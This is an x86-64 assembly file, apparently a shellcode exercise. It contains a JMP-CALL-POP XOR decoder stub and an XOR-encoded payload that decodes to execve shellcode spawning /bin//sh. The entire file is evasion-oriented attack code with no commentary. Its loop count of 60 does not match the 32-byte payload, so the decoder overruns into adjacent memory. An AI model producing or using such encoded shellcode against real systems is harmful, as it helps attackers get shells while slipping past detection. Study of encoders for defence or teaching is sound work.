global _start 

section .text

_start:

	jmp find_address

decoder:
	; Get the address of the string 
	pop rdi
	xor rcx, rcx
	add cl, 60


decode:
	xor byte [rdi], 0xAA
	inc rdi
	loop decode

	jmp encoded_shellcode
	

find_address:
	call decoder

	encoded_shellcode:	db	0xe2,0x9b,0x6a,0xfa,0xe2,0x11,0x85,0xc8,0xc3,0xc4,0x85,0x85,0xd9,0xc2,0xf9,0xe2,0x23,0x4d,0xfa,0xe2,0x23,0x48,0xfd,0xe2,0x23,0x4c,0xe2,0x29,0x6a,0x91,0xa5,0xaf

